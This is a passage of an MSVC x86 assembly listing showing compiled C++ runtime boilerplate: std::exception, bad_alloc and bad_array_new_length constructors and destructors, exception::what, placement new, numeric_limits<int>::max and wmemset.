  00009	e8 00 00 00 00	 call	 ??0bad_array_new_length@std@@QAE@XZ ; std::bad_array_new_length::bad_array_new_length
  0000e	68 00 00 00 00	 push	 OFFSET __TI3?AVbad_array_new_length@std@@
  00013	8d 45 f4	 lea	 eax, DWORD PTR $T1[ebp]
  00016	50		 push	 eax
  00017	e8 00 00 00 00	 call	 __CxxThrowException@8
$LN1@Throw_bad_:

; 65   : }

  0001c	8b e5		 mov	 esp, ebp
  0001e	5d		 pop	 ebp
  0001f	c3		 ret	 0
?_Throw_bad_array_new_length@std@@YAXXZ ENDP		; std::_Throw_bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gbad_array_new_length@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gbad_array_new_length@std@@UAEPAXI@Z PROC		; std::bad_array_new_length::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1bad_array_new_length@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 0c		 push	 12			; 0000000cH
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gbad_array_new_length@std@@UAEPAXI@Z ENDP		; std::bad_array_new_length::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0bad_array_new_length@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0bad_array_new_length@std@@QAE@ABV01@@Z PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0bad_alloc@std@@QAE@ABV01@@Z
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7bad_array_new_length@std@@6B@
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 04 00	 ret	 4
??0bad_array_new_length@std@@QAE@ABV01@@Z ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1bad_array_new_length@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1bad_array_new_length@std@@UAE@XZ PROC		; std::bad_array_new_length::~bad_array_new_length, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UAE@XZ
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1bad_array_new_length@std@@UAE@XZ ENDP		; std::bad_array_new_length::~bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0bad_array_new_length@std@@QAE@XZ PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT
; _this$ = ecx

; 141  :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 140  :         : bad_alloc("bad array new length")

  00007	68 00 00 00 00	 push	 OFFSET ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ??0bad_alloc@std@@AAE@QBD@Z ; std::bad_alloc::bad_alloc

; 141  :     {

  00014	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00017	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7bad_array_new_length@std@@6B@

; 142  :     }

  0001d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00020	8b e5		 mov	 esp, ebp
  00022	5d		 pop	 ebp
  00023	c3		 ret	 0
??0bad_array_new_length@std@@QAE@XZ ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gbad_alloc@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gbad_alloc@std@@UAEPAXI@Z PROC			; std::bad_alloc::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 0c		 push	 12			; 0000000cH
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gbad_alloc@std@@UAEPAXI@Z ENDP			; std::bad_alloc::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0bad_alloc@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0bad_alloc@std@@QAE@ABV01@@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0exception@std@@QAE@ABV01@@Z ; std::exception::exception
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7bad_alloc@std@@6B@
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 04 00	 ret	 4
??0bad_alloc@std@@QAE@ABV01@@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1bad_alloc@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1bad_alloc@std@@UAE@XZ PROC				; std::bad_alloc::~bad_alloc, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1exception@std@@UAE@XZ ; std::exception::~exception
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1bad_alloc@std@@UAE@XZ ENDP				; std::bad_alloc::~bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@AAE@QBD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Message$ = 8						; size = 4
??0bad_alloc@std@@AAE@QBD@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
; _this$ = ecx

; 130  :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 129  :         : exception(_Message, 1)

  00007	6a 01		 push	 1
  00009	8b 45 08	 mov	 eax, DWORD PTR __Message$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00010	e8 00 00 00 00	 call	 ??0exception@std@@QAE@QBDH@Z ; std::exception::exception

; 130  :     {

  00015	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00018	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7bad_alloc@std@@6B@

; 131  :     }

  0001e	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00021	8b e5		 mov	 esp, ebp
  00023	5d		 pop	 ebp
  00024	c2 04 00	 ret	 4
??0bad_alloc@std@@AAE@QBD@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gexception@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gexception@std@@UAEPAXI@Z PROC			; std::exception::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1exception@std@@UAE@XZ ; std::exception::~exception
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 0c		 push	 12			; 0000000cH
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gexception@std@@UAEPAXI@Z ENDP			; std::exception::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ?what@exception@std@@UBEPBDXZ
_TEXT	SEGMENT
tv69 = -8						; size = 4
_this$ = -4						; size = 4
?what@exception@std@@UBEPBDXZ PROC			; std::exception::what, COMDAT
; _this$ = ecx

; 94   :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 95   :         return _Data._What ? _Data._What : "Unknown exception";

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 04 00	 cmp	 DWORD PTR [eax+4], 0
  00010	74 0b		 je	 SHORT $LN3@what
  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	8b 51 04	 mov	 edx, DWORD PTR [ecx+4]
  00018	89 55 f8	 mov	 DWORD PTR tv69[ebp], edx
  0001b	eb 07		 jmp	 SHORT $LN4@what
$LN3@what:
  0001d	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv69[ebp], OFFSET ??_C@_0BC@EOODALEL@Unknown?5exception@
$LN4@what:
  00024	8b 45 f8	 mov	 eax, DWORD PTR tv69[ebp]

; 96   :     }

  00027	8b e5		 mov	 esp, ebp
  00029	5d		 pop	 ebp
  0002a	c3		 ret	 0
?what@exception@std@@UBEPBDXZ ENDP			; std::exception::what
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1exception@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1exception@std@@UAE@XZ PROC				; std::exception::~exception, COMDAT
; _this$ = ecx

; 89   :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7exception@std@@6B@

; 90   :         __std_exception_destroy(&_Data);

  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	83 c1 04	 add	 ecx, 4
  00016	51		 push	 ecx
  00017	e8 00 00 00 00	 call	 ___std_exception_destroy
  0001c	83 c4 04	 add	 esp, 4

; 91   :     }

  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c3		 ret	 0
??1exception@std@@UAE@XZ ENDP				; std::exception::~exception
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Other$ = 8						; size = 4
??0exception@std@@QAE@ABV01@@Z PROC			; std::exception::exception, COMDAT
; _this$ = ecx

; 72   :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7exception@std@@6B@

; 71   :         : _Data()

  00010	33 c9		 xor	 ecx, ecx
  00012	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00015	83 c2 04	 add	 edx, 4
  00018	89 0a		 mov	 DWORD PTR [edx], ecx
  0001a	89 4a 04	 mov	 DWORD PTR [edx+4], ecx

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0001d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00020	83 c0 04	 add	 eax, 4
  00023	50		 push	 eax
  00024	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  00027	83 c1 04	 add	 ecx, 4
  0002a	51		 push	 ecx
  0002b	e8 00 00 00 00	 call	 ___std_exception_copy
  00030	83 c4 08	 add	 esp, 8

; 74   :     }

  00033	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00036	8b e5		 mov	 esp, ebp
  00038	5d		 pop	 ebp
  00039	c2 04 00	 ret	 4
??0exception@std@@QAE@ABV01@@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QAE@QBDH@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Message$ = 8						; size = 4
___formal$ = 12						; size = 4
??0exception@std@@QAE@QBDH@Z PROC			; std::exception::exception, COMDAT
; _this$ = ecx

; 66   :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7exception@std@@6B@

; 65   :         : _Data()

  00010	33 c9		 xor	 ecx, ecx
  00012	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00015	83 c2 04	 add	 edx, 4
  00018	89 0a		 mov	 DWORD PTR [edx], ecx
  0001a	89 4a 04	 mov	 DWORD PTR [edx+4], ecx

; 67   :         _Data._What = _Message;

  0001d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00020	8b 4d 08	 mov	 ecx, DWORD PTR __Message$[ebp]
  00023	89 48 04	 mov	 DWORD PTR [eax+4], ecx

; 68   :     }

  00026	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00029	8b e5		 mov	 esp, ebp
  0002b	5d		 pop	 ebp
  0002c	c2 08 00	 ret	 8
??0exception@std@@QAE@QBDH@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QAE@QBD@Z
_TEXT	SEGMENT
__InitData$ = -12					; size = 8
_this$ = -4						; size = 4
__Message$ = 8						; size = 4
??0exception@std@@QAE@QBD@Z PROC			; std::exception::exception, COMDAT
; _this$ = ecx

; 59   :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7exception@std@@6B@

; 58   :         : _Data()

  00012	33 c9		 xor	 ecx, ecx
  00014	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00017	83 c2 04	 add	 edx, 4
  0001a	89 0a		 mov	 DWORD PTR [edx], ecx
  0001c	89 4a 04	 mov	 DWORD PTR [edx+4], ecx

; 60   :         __std_exception_data _InitData = { _Message, true };

  0001f	8b 45 08	 mov	 eax, DWORD PTR __Message$[ebp]
  00022	89 45 f4	 mov	 DWORD PTR __InitData$[ebp], eax
  00025	c6 45 f8 01	 mov	 BYTE PTR __InitData$[ebp+4], 1

; 61   :         __std_exception_copy(&_InitData, &_Data);

  00029	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002c	83 c1 04	 add	 ecx, 4
  0002f	51		 push	 ecx
  00030	8d 55 f4	 lea	 edx, DWORD PTR __InitData$[ebp]
  00033	52		 push	 edx
  00034	e8 00 00 00 00	 call	 ___std_exception_copy
  00039	83 c4 08	 add	 esp, 8

; 62   :     }

  0003c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0003f	8b e5		 mov	 esp, ebp
  00041	5d		 pop	 ebp
  00042	c2 04 00	 ret	 4
??0exception@std@@QAE@QBD@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_new.h
;	COMDAT ??2@YAPAXIPAX@Z
_TEXT	SEGMENT
__Size$ = 8						; size = 4
__Where$ = 12						; size = 4
??2@YAPAXIPAX@Z PROC					; operator new, COMDAT

; 168  :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 169  :         (void)_Size;
; 170  :         return _Where;

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Where$[ebp]

; 171  :     }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??2@YAPAXIPAX@Z ENDP					; operator new
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\limits
;	COMDAT ?max@?$numeric_limits@H@std@@SAHXZ
_TEXT	SEGMENT
?max@?$numeric_limits@H@std@@SAHXZ PROC			; std::numeric_limits<int>::max, COMDAT

; 546  :     _NODISCARD static constexpr int(max)() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 547  :         return INT_MAX;

  00003	b8 ff ff ff 7f	 mov	 eax, 2147483647		; 7fffffffH

; 548  :     }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
?max@?$numeric_limits@H@std@@SAHXZ ENDP			; std::numeric_limits<int>::max
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\ucrt\wchar.h
;	COMDAT _wmemset
_TEXT	SEGMENT
__Su$ = -4						; size = 4
__S$ = 8						; size = 4
__C$ = 12						; size = 2
__N$ = 16						; size = 4
_wmemset PROC						; COMDAT

; 257  :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 258  :         wchar_t *_Su = _S;

  00004	8b 45 08	 mov	 eax, DWORD PTR __S$[ebp]
  00007	89 45 fc	 mov	 DWORD PTR __Su$[ebp], eax

; 259  :         for (; 0 < _N; ++_Su, --_N)

  0000a	eb 12		 jmp	 SHORT $LN4@wmemset
$LN2@wmemset:
  0000c	8b 4d fc	 mov	 ecx, DWORD PTR __Su$[ebp]
  0000f	83 c1 02	 add	 ecx, 2
  00012	89 4d fc	 mov	 DWORD PTR __Su$[ebp], ecx
  00015	8b 55 10	 mov	 edx, DWORD PTR __N$[ebp]
  00018	83 ea 01	 sub	 edx, 1
  0001b	89 55 10	 mov	 DWORD PTR __N$[ebp], edx
$LN4@wmemset:
  0001e	83 7d 10 00	 cmp	 DWORD PTR __N$[ebp], 0
  00022	76 0c		 jbe	 SHORT $LN3@wmemset

; 260  :         {
; 261  :             *_Su = _C;

  00024	8b 45 fc	 mov	 eax, DWORD PTR __Su$[ebp]
  00027	66 8b 4d 0c	 mov	 cx, WORD PTR __C$[ebp]
  0002b	66 89 08	 mov	 WORD PTR [eax], cx

; 262  :         }

  0002e	eb dc		 jmp	 SHORT $LN2@wmemset
$LN3@wmemset:

; 263  :         return _S;

  00030	8b 45 08	 mov	 eax, DWORD PTR __S$[ebp]

; 264  :     }

  00033	8b e5		 mov	 esp, ebp
  00035	5d		 pop	 ebp
  00036	c3		 ret	 0
_wmemset ENDP
_TEXT	ENDS
END
